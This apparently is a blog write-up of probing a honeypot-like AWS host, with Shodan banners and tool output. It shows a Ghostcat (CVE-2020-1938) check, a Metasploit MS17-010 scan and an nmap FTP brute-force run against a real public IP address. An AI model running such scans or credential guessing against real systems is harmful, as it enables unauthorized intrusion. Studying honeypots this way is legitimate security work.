# Recon


![ shodan ](https://github.com/kalimax69/BlogContent/blob/main/shodan.png)

``` ruby

(base) mx@M1 homebrew % shodan host 18.220.190.92
18.220.190.92
Hostnames:               example.com;ec2-18-220-190-92.us-east-2.compute.amazonaws.com
City:                    Hilliard
Country:                 United States
Organization:            Amazon Technologies Inc.
Updated:                 2022-07-19T04:02:14.010052
Number of open ports:    388
Vulnerabilities:         CVE-2020-1938	MS17-010	

Ports: 
     22/tcp OpenSSH (7.9p1)
     25/tcp Exim smtpd (4.81)
    135/tcp Microsoft RPC  
    443/tcp Apache httpd 
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3
    445/tcp   
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3
    623/udp  
    995/tcp  
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2
   1050/tcp  
   1433/tcp MS-SQL Server 2000 SP1+ (8.0.528.0)
   1723/tcp PPTP 
   1883/tcp MQTT 
   3306/tcp MySQL (5.7.16)
   3389/tcp Remote Desktop Protocol 
   4899/tcp Famatech Radmin 
   5432/tcp PostgreSQL 
   5900/tcp VNC 
   8009/tcp Apache Tomcat (9.0.30)
   8443
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2
   8500
   9200/tcp Elastichoney (1.4.1)
  10001/tcp Gaspot 
  
 ```
 
 ``` bash

21 / tcp

220 FTP server ready.
230 Anonymous login ok, access restrictions apply.
502 Command 'HELP' not implemented
211-Features:
 PASV
 PORT
211 End

1967103984 | 2022-07-05T21:04:17.620180
        

22 / tcp
OpenSSH7.9p1

SSH-2.0-OpenSSH_7.9p1
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQC7IO4D19328sNrDhpJjzUvyWdSzFAGToQELeZXHT+dFdS5
xAHqvfmn24zU9BRG7osN2hzB3BAXwaSBWrB9e9YX9rVRQ/7QuVy399vhZFXckZa708KRnod7ixd2
TgyQEiF2WfH71WriEDcrhir+B0qV6JMQNKVhOZST++6en2r62e0a4NuzuTtIPqS882dieipulbah
Q5yFnQ+QIc0a07JObr9VQpsWaICVPLx/bzTChPvKmnm6+7Nue4+VWid24wCH1xd9z7xrrLNWZjC3
sNYggSXOXQmx/nuKQ05UAiEBCqi5F4Vdmf/G00d0HMNAmPf3esf/nggSdTzIrb25Gv7X
Fingerprint: ee:76:f5:1a:26:2a:c4:eb:da:42:4d:f4:c2:33:bc:f5

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	ssh-rsa
	ssh-dss
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes256-cbc
	aes192-cbc
	aes128-cbc
	3des-cbc
	blowfish-cbc
	cast128-cbc

MAC Algorithms:
	hmac-sha2-512
	hmac-sha2-384
	hmac-sha2-56
	hmac-sha1
	hmac-md5

Compression Algorithms:
	zlib@openssh.com
	zlib
	none

-931697787 | 2022-07-15T11:20:15.973026
        

23 / tcp

login: 

-355842772 | 2022-06-28T13:38:49.955180
        

25 / tcp
Exim smtpd4.81

220 mailrelay.local ESMTP Exim 4.81 #1 Thu, 29 Jul 2010 05:13:48 -0700
250-mailrelay.local Hello VlY4o1Dp22chKW.net [224.104.242.204]
250-SIZE 52428800
250 AUTH LOGIN PLAIN

-1022127223 | 2022-07-09T17:01:23.261837
        

80 / tcp

HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sess_uuid=db8a23fa-c421-4398-89a2-0a4f2c0516ce
Content-Length: 1904
Date: Sat, 09 Jul 2022 16:59:31 GMT
Server: Python/3.9 aiohttp/3.7.4

-317762099 | 2022-07-17T01:51:56.505675
        

110 / tcp

+OK POP3 server ready
-ERR Unknown command

2030592451 | 2022-06-26T16:04:01.565512
        

135 / tcp
Microsoft RPC

\x05\x00\x0c\x03\x10\x00\x00\x00D\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\xf7N\x00\x00\x0e\x00\\PIPE\\browser\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04]\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00+\x10H`\x02\x00\x00\x00

855578617 | 2022-07-04T08:53:28.835337
        

161 / udp

0A\x02\x01\x00\x04\x06public\xa24\x02\x04f\xb1j^\x02\x01\x00\x02\x01\x000&0$\x06\x08+\x06\x01\x02\x01\x01\x01\x00\x04\x18Siemens, SIMATIC, S7-300

-648875331 | 2022-07-15T05:57:43.589077
        

443 / tcp
Apache httpd

HTTP/1.1 200 OK
Server: Apache
Content-Length: 1669
Content-type: text/html
Connection: Close

SSL Certificate

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            01:3c:6e:86:72:bc:9e:fd:c5:cf:7d:06:c2:d8:4d:c2:12:72:22:39
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Validity
            Not Before: Sep 20 14:36:22 2021 GMT
            Not After : Sep 20 14:36:22 2022 GMT
        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ce:c7:7e:f2:97:b1:e7:cf:b5:2b:e9:8e:5e:44:
                    6d:09:c6:14:80:70:ac:ac:84:06:a7:48:75:9b:a6:
                    af:1b:5e:95:5c:d9:04:28:f7:a7:c2:5c:4f:41:4b:
                    16:18:0e:df:33:eb:b3:82:e0:23:ef:4e:8e:30:7d:
                    d4:b1:e0:ae:0f:91:98:a7:8b:05:e3:03:8d:b1:37:
                    6c:dc:6a:4c:1b:18:4e:22:cb:05:61:df:95:4d:7b:
                    c2:eb:5b:78:72:62:00:22:23:15:13:0a:7b:07:30:
                    b5:dd:7f:34:df:0f:c6:89:cc:4f:3d:da:f0:64:73:
                    1f:c3:85:11:9a:c5:9f:24:ee:c6:10:0d:87:d0:4d:
                    b8:f8:93:9f:c1:bb:a2:c2:d9:8a:6f:56:e9:aa:1b:
                    e5:a0:6e:bd:2c:bf:98:bd:14:67:bc:53:f0:20:47:
                    fd:ef:0a:f3:e9:84:f5:9a:5c:92:18:e0:d7:8b:34:
                    a2:56:7f:c5:d6:86:37:f3:ca:ab:02:b7:0b:cd:2d:
                    a8:30:2f:da:04:e9:bc:82:dd:63:d3:18:d0:4c:b5:
                    a3:3c:6d:2b:c3:a0:ce:f2:c7:80:bd:3c:a2:5b:d4:
                    75:e3:71:df:b5:84:92:fd:36:37:0c:b8:ad:c9:14:
                    de:9a:e9:4b:ba:ea:ac:63:7e:de:07:b9:8b:be:bf:
                    09:79
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                C1:FA:A0:0F:45:E1:20:1C:6B:06:60:B3:CF:03:65:BE:03:6C:66:4A
            X509v3 Authority Key Identifier: 
                C1:FA:A0:0F:45:E1:20:1C:6B:06:60:B3:CF:03:65:BE:03:6C:66:4A
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        2b:5f:b0:67:98:66:d0:fa:9b:10:6b:d6:fe:9a:25:6a:b2:38:
        31:24:20:46:fa:dc:cd:05:67:a1:7c:23:9c:83:8d:3b:25:fb:
        7c:e0:7f:aa:c5:8d:1b:8e:67:aa:47:3c:87:24:22:ee:3d:b8:
        d3:8d:48:12:36:cd:7b:11:59:7a:c3:c7:bc:a1:d8:63:19:ee:
        8f:53:d3:34:2c:da:53:30:86:7b:58:92:a2:ea:40:99:58:2c:
        13:d7:48:db:e2:88:40:4c:58:a5:44:68:ed:52:f6:39:2c:e6:
        5a:df:8b:49:77:36:da:4f:e0:e8:ec:0e:71:f1:5c:b5:53:0a:
        d7:b7:aa:c9:c9:8d:c5:aa:50:4d:63:b8:8a:76:06:b5:98:a5:
        88:32:2a:fc:79:f8:72:bc:5c:c8:07:44:59:30:eb:12:a5:00:
        ef:22:94:cc:37:80:b0:48:8f:40:69:0a:d1:20:8d:84:88:69:
        38:9f:d1:d5:12:30:69:69:da:05:d6:82:a5:51:37:b0:83:0a:
        4b:5c:0d:37:e8:cc:5a:9e:6f:48:5b:c0:b9:38:ab:bf:9b:5d:
        6d:f1:1d:2d:70:1f:89:1b:74:55:0b:44:a5:20:f7:eb:10:04:
        8f:99:00:75:54:db:90:bb:09:74:be:c5:d0:7e:58:4d:ae:d2:
        7e:06:01:1d

-862740337 | 2022-06-20T19:10:30.573244
        

445 / tcp

SMB Status:
  Authentication: disabled
  SMB Version: 1
  OS: Windows 7 Professional 7600
  Software: Windows 7 Professional 6.1
  Capabilities: extended-security, infolevel-passthru, large-files, large-readx, large-writex, level2-oplocks, lock-and-read, nt-find, nt-smb, nt-status, raw-mode, rpc-remote-api, unicode

Shares
Name                 Type       Comments
------------------------------------------------------------------------
ADMIN$               Disk       Remote Admin
C$                   Disk       Default Share
IPC$                 IPC        Remote IPC
Printer              Printer    Microsoft XPS Document Writer

1043590104 | 2022-07-14T09:39:08.135532
        

465 / tcp

220 Microsoft ESMTP MAIL service ready 
250-Microsoft ESMTP MAIL service ready Hello 7uWpTS4UyN.com
250-AUTH PLAIN LOGIN CRAM-MD5
250 EHLO

SSL Certificate

Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 0 (0x0)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=*, C=US, ST=None, L=None, O=None, OU=None
        Validity
            Not Before: Jul 13 13:06:37 2022 GMT
            Not After : Jul 13 13:06:37 2023 GMT
        Subject: CN=*, C=US, ST=None, L=None, O=None, OU=None
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:b0:c7:35:86:bc:49:df:69:af:db:82:fc:6d:7a:
                    24:0c:99:c2:8a:8c:a0:ac:8f:b2:8c:a5:c8:bc:b3:
                    9b:bc:7a:fd:dc:8a:cd:4d:ec:bb:e0:55:7c:4b:79:
                    a3:e8:f1:4b:60:5b:db:f7:17:a8:22:a2:51:6b:c7:
                    c7:92:f0:c6:bc:65:a4:05:16:81:0a:8a:9c:e9:3d:
                    28:b4:c6:fb:3c:23:61:ca:c5:00:df:22:75:6b:43:
                    1a:c6:7b:23:a2:bd:03:a9:fb:c0:aa:15:11:dd:a6:
                    6d:a4:a9:56:7a:af:fb:0f:eb:db:76:63:8f:86:f1:
                    0e:05:ac:23:63:f3:ca:3f:d1:f7:30:a8:6d:b7:95:
                    93:ba:71:ff:aa:b5:18:cf:4a:4a:86:70:96:c4:d9:
                    10:9b:82:ce:e0:5b:ae:b2:1e:eb:f3:f7:9d:99:7e:
                    9e:53:02:c3:6a:ad:15:37:65:e9:1c:08:0f:c0:38:
                    57:15:a1:b6:15:64:4a:ef:ea:ff:e3:51:87:17:b4:
                    ae:4a:31:50:17:4f:89:49:d4:83:dc:04:f3:09:6b:
                    f7:a3:df:09:8d:6e:53:15:2a:70:82:8f:90:c1:2f:
                    0e:67:c4:f1:4c:b4:ac:89:e6:58:96:52:c6:d2:ad:
                    de:52:08:f5:b4:31:fa:ad:d4:c9:38:76:09:25:40:
                    f9:8d
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha1WithRSAEncryption
    Signature Value:
        8d:4f:05:d4:36:14:eb:f1:09:81:2d:83:4a:ca:58:9f:f1:9c:
        77:c7:36:70:06:0e:cd:06:13:c7:6d:84:18:c7:e2:2a:94:1d:
        0d:01:18:68:83:aa:55:c3:8b:e7:16:2c:a3:89:d8:17:85:4c:
        9a:60:8d:b3:91:4f:73:43:7f:4e:d7:05:17:05:b4:8e:05:43:
        6e:b0:cd:85:09:6e:90:32:db:06:4b:11:a5:63:6d:f0:16:ed:
        a6:c1:a2:80:e1:8b:42:77:9c:6d:70:be:5d:da:45:96:10:9d:
        cc:3f:82:e7:f5:15:99:b5:49:8d:64:70:75:46:0b:21:81:4d:
        66:e9:be:4f:6e:8b:8a:67:29:5b:f5:ea:6a:ff:b5:79:51:80:
        ab:fb:7b:79:45:cb:10:7f:5f:e2:43:71:52:e2:92:4e:c9:cb:
        fe:6e:2b:32:e8:91:76:74:57:76:9c:c7:4f:61:88:63:88:40:
        b5:22:4b:c3:c6:ab:61:ec:0b:93:f2:26:84:7a:de:64:c7:02:
        6b:e8:02:6f:ff:d7:45:38:56:4a:ec:8e:15:5a:49:07:86:69:
        bc:c6:75:28:4d:f0:61:85:64:24:79:64:66:c6:82:c8:b6:00:
        c0:a2:4b:c4:c0:df:bf:e3:df:fb:3b:64:2a:9c:00:07:a5:54:
        02:de:64:e4

928780606 | 2022-06-20T03:37:51.076688
        

623 / udp

\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x81\x1cc \x008\x00\x01\x80\x04\x02\x00\x00\x00\x00!

-317762099 | 2022-07-06T14:20:39.081506
        

995 / tcp

+OK POP3 server ready
-ERR Unknown command

SSL Certificate

Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 0 (0x0)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=*, C=US, ST=None, L=None, O=None, OU=None
        Validity
            Not Before: Jul  6 13:06:33 2022 GMT
            Not After : Jul  6 13:06:33 2023 GMT
        Subject: CN=*, C=US, ST=None, L=None, O=None, OU=None
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:bd:a3:bd:ab:b3:6b:22:c6:cc:73:82:f9:b0:ef:
                    3f:04:1a:93:c6:58:24:b6:00:97:f8:59:e9:d4:54:
                    d9:60:62:4c:3d:a4:29:ee:66:15:3d:9d:38:bd:ba:
                    80:b4:00:39:82:65:fb:1e:d1:77:f0:ca:5c:2a:8c:
                    13:f5:5c:f2:79:4b:88:79:59:c0:e5:a0:0b:75:4f:
                    0a:a0:8d:a3:78:63:1d:10:11:db:bd:dd:5d:6d:d5:
                    23:f1:5c:f7:c1:c7:54:34:0b:3a:4b:b6:03:bc:f0:
                    35:90:dc:23:22:13:34:01:31:e4:9c:67:2d:fd:03:
                    25:b3:a5:d1:32:56:92:48:51:77:f7:42:68:67:3e:
                    2f:10:3a:c6:46:e0:89:96:4a:0a:a2:4c:ae:2b:b8:
                    fe:a1:d1:a3:c9:60:bb:72:5e:87:b0:b9:db:65:99:
                    53:88:bf:c4:a8:30:71:17:5e:c5:9e:b1:2c:4e:20:
                    fb:16:15:a7:f0:3c:b6:60:fb:5b:0e:71:c3:f9:bd:
                    71:d0:01:09:cf:fd:af:3e:33:8f:29:ab:3c:2e:af:
                    3e:0f:d9:ec:a8:da:98:d3:87:e2:e7:4b:a0:92:ca:
                    a2:66:14:0e:c1:a6:99:e7:ed:bb:3c:54:2e:93:72:
                    45:4b:73:d5:31:f7:d7:50:97:5b:56:8f:7c:26:24:
                    89:5b
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha1WithRSAEncryption
    Signature Value:
        75:1b:cb:d0:dc:6b:b6:c7:84:7e:d7:48:93:8d:16:18:14:7d:
        5b:7c:c6:9f:2e:97:9d:bf:c6:95:61:cb:02:7a:55:20:06:8a:
        a2:16:fd:dc:e8:a0:46:6e:95:66:4d:c3:b8:83:79:ab:86:38:
        61:29:65:f9:f8:63:7f:5f:df:a7:c7:d7:9a:dd:ea:0b:0a:50:
        6d:34:23:2d:dc:90:81:8c:2e:b3:db:28:0b:91:a2:cd:c2:fd:
        9a:6b:bc:7c:a3:48:52:70:6b:82:d9:fe:87:a3:b1:05:d1:a6:
        84:8a:a0:18:29:07:e7:1b:9b:44:6e:3a:23:0e:57:b1:3f:81:
        7a:3b:2a:c1:a1:99:b8:05:fe:21:68:8b:e6:f4:9e:91:1f:ac:
        9f:fa:c3:12:e6:81:3f:65:9c:7e:72:ae:8d:50:48:6f:3d:1c:
        6f:aa:90:82:6f:e0:b4:67:65:0c:0f:84:42:02:35:6e:0e:69:
        e3:77:43:a4:3b:c8:d1:ea:65:4a:ff:ed:6a:07:7d:ab:de:0c:
        78:f3:c6:97:bb:d2:36:be:f6:59:cc:ed:70:4f:8a:51:c1:fa:
        95:a3:7a:1b:7d:76:be:7e:8a:bc:4d:d9:84:f3:50:1a:5c:bd:
        ef:96:2e:02:f3:98:ac:b6:40:ad:f1:8a:7d:b8:ca:0a:4a:30:
        ed:74:fe:69

```

![honey](https://github.com/kalimax69/BlogContent/blob/main/honey2.png)

 
 
 # Testing for CVE-2020-1938 Apache Jserv
 
 ``` bash
 
 ┌──(root💀kali)-[~/honeypot]
└─# python2 ghost.py 18.220.190.92                                                                                           
Getting resource at ajp13://18.220.190.92:8009/asdf
----------------------------
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.30</h3></body></html>

```


# Testing for MS17-010 ETERNAL BLUE

``` bash

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[-] 18.220.190.92:445     - Rex::ConnectionTimeout: The connection with (18.220.190.92:445) timed out.
[*] 18.220.190.92:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > 

```

# Testing FTP

``` bash

─# nmap --script ftp-* p21 18.220.190.92                                                                                  255 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 13:49 PDT
Failed to resolve "p21".
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 13:50 (0:00:00 remaining)
Nmap scan report for ec2-18-220-190-92.us-east-2.compute.amazonaws.com (18.220.190.92)
Host is up (0.081s latency).
Not shown: 143 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
| ftp-brute: 
|   Accounts: 
|     root:root - Valid credentials
|     user:user - Valid credentials
|     web:web - Valid credentials
|     netadmin:netadmin - Valid credentials
|     guest:guest - Valid credentials
|     sysadmin:sysadmin - Valid credentials
|     administrator:administrator - Valid credentials
|     webadmin:webadmin - Valid credentials
|     admin:admin - Valid credentials
|     test:test - Valid credentials
|_  Statistics: Performed 117 guesses in 4 seconds, average tps: 29.2
|_ftp-libopie: ERROR: Script execution failed (use -d to debug)

```


# Testing Github login page Port 80

``` bash

(base) mx@M1 homebrew % nslookup github.com
Server:		2001:578:3f::30
Address:	2001:578:3f::30#53

Non-authoritative answer:
Name:	github.com
Address: 140.82.114.3

(base) mx@M1 homebrew % nslookup 172.20.254.127
Server:		2001:578:3f::30
Address:	2001:578:3f::30#53

** server can't find 127.254.20.172.in-addr.arpa: NXDOMAIN

(base) mx@M1 homebrew % nslookup http://172.20.254.127
Server:		2001:578:3f::30
Address:	2001:578:3f::30#53

** server can't find http://172.20.254.127: NXDOMAIN

```
![github](https://github.com/kalimax69/BlogContent/blob/main/burp.png)
